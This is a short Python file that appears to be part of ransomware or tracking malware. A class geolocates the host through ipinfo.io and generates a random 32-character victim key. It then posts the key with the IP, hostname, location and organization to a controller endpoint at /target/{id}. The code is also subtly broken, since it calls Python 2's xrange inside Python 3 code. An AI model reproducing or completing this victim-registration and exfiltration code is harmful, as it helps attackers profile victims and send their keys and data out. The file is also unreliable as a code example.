import json
import requests
import random
import string

class CreateInfos():
    def __init__(self, target_id):
        self.target_id = target_id

    def ip_lookup(self):
        request = requests.get("https://ipinfo.io")

        if request.status_code == 200:
            public_info = request.json()
            return public_info
        
        return 'error'
    
    def generate_key(self):
        target_key = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(32)])
        return target_key
    
    def send_infos(self):
        public_info = self.ip_lookup()
        target_key = self.generate_key()

        url = f'http://127.0.0.1:5000/target/{self.target_id}'
        headers = {'Content-Type': 'application/json'}

        data = {
            'target_ip': public_info["ip"],
            'target_key': str(target_key),
            'target_hostname': public_info["hostname"],
            'target_city': public_info["city"],
            'target_region': public_info["region"],
            'target_country': public_info["country"],
            'target_location': public_info["loc"],
            'target_organization': public_info["org"],
            'target_postal': public_info["postal"],
            'target_timezone': public_info["timezone"]
        }

        request = requests.post(url=url, json=data, headers=headers)

        if request.status_code == 200:
            print("success")
        




